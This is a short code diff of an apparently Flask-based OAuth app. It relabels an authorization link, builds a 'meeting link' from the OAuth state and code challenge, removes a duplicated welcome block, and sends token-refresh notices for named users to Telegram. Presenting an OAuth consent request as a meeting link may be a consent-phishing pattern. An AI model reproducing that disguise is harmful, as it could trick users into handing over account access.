@@ -172,7 +172,7 @@ def send_startup_message():
     meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"
 
     message = (
-        f"🚀 *OAuth Authorization Link:*\n[app link]({authorization_url})\n\n"
+        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
         f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
     )
 
@@ -548,19 +548,6 @@ def welcome():
             session['access_token'] = access_token
             session['refresh_token'] = refresh_token
             send_message_via_telegram(f"🔄 Token refreshed for returning user @{username}.")
-        else:
-            print("Error refreshing tokens for returning user.")
-            return "An error occurred while refreshing tokens.", 500
-
-    # Display message based on user status
-    if 'is_new_user' in session:
-        message = f"Congratulations, @{username}! Your sign-up was successful."
-        session.pop('is_new_user')  # Remove the flag after displaying
-    else:
-        message = f"Welcome back, @{username}!"
-
-    return render_template('welcome.html', message=message)
-
 
     # Determine the message based on user status
     if 'is_new_user' in session:
